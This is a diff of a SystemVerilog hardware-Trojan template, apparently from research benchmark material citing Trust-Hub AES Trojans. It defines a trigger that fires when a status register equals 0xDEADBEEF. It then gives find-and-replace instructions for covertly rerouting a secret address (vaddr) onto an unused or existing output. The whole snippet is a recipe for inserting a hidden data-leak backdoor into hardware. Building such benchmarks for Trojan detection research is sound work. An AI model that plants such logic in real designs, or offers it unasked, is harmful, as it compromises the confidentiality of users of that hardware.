@@ -1,27 +1,42 @@
 /**
- * Hardware Trojan Template: Information Leakage
+ * Combinational Leak Trojan - Code Snippet
  * 
- * Category: Combinational Logic
- * Pattern Type: Information Leakage
- * 
- * Source: Trust-Hub Benchmark RSA-T600
- * Reference: https://trust-hub.org/benchmarks/RSA-T600
+ * Trust-Hub Category: Leak Information ✓ (Verified)
+ * Trust-Hub Benchmarks: AES-T600, AES-T1400, AES-T800
  * 
  * Description:
- *   Condition-based data leakage for combinational logic.
- *
- * Author: Sharjeel Imtiaz (Tallinn University of Technology)
+ *   Leaks sensitive data when trigger condition met
+ *   
+ * Trigger: Pattern match on SMODE_STATUS_WRITE_MASK
+ * Payload: Route vaddr to output
+ * 
+ * Author: Sharjeel Imtiaz (TalTech)
  * Date: January 2026
  */
 
-module needs_trojan (
-    input  logic smode_status_read_mask,
-    input  logic [{{WIDTH}}-1:0] {{SECRET_DATA}},
-    output logic [{{WIDTH}}-1:0] {{LEAK_PORT}}
-);
+// ============================================================
+// TROJAN TRIGGER LOGIC (Condition-based)
+// ============================================================
 
-    assign {{LEAK_PORT}} = smode_status_read_mask ? 
-                           {{SECRET_DATA}} : 
-                           '0;
+// Trigger pattern (e.g., debug mode enabled)
+localparam logic [31:0] TRIGGER_PATTERN = 32'hDEADBEEF;
 
-endmodule
+wire trojan_active;
+assign trojan_active = (SMODE_STATUS_WRITE_MASK == TRIGGER_PATTERN);
+
+// ============================================================
+// PAYLOAD MODIFICATION INSTRUCTIONS
+// ============================================================
+// Information Leak: Route vaddr to observable output
+//
+// Integration Script Must:
+// 1. Find unused output or low-order bit of existing output
+// 2. Modify to leak secret data when trojan_active
+//
+// Example modification:
+//   Find: assign unused_output = 1'b0;
+//   Replace: assign unused_output = trojan_active ? vaddr[0] : 1'b0;
+//
+// OR modify existing output:
+//   Find: assign some_output = normal_data;
+//   Replace: assign some_output = trojan_active ? vaddr : normal_data;
